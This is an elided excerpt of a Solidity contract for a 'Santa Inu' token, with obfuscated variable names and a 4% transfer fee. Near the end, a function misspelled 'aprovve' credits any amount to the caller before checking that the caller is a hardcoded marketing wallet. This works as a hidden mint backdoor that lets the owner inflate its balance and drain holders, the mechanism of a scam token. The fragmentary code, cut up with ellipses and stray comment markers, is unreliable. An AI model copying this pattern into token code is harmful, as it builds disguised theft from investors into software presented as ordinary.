...
contract Context {
 ...
 contract SantaInu is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloSANTA;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Santa Inu";
    string private _symbol = "SANTANU";
    ...
    uint256 private cryfaleSANTA = 4;
    uint256 private _vebegoSANTA = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloSANTA[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletSANTA = 0x885BA58F34375f26C7149c2f3f18373536c2FD95;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloSANTA[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloSANTA[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleSANTA / 100) / _vebegoSANTA;
        allons = allons -  (_fee * _vebegoSANTA);
        
        superfloSANTA[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaSANTA) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloSANTA[account];
        require(accountBalance >= gzillaSANTA, "BEP : Can't be done");
        unchecked {
            superfloSANTA[account] = accountBalance - gzillaSANTA;
        }
        _totalSupply -= gzillaSANTA;

        emit Transfer(account, address(0), gzillaSANTA);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloSANTA[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletSANTA, "ERC20: cannot permit dev address");
    }   
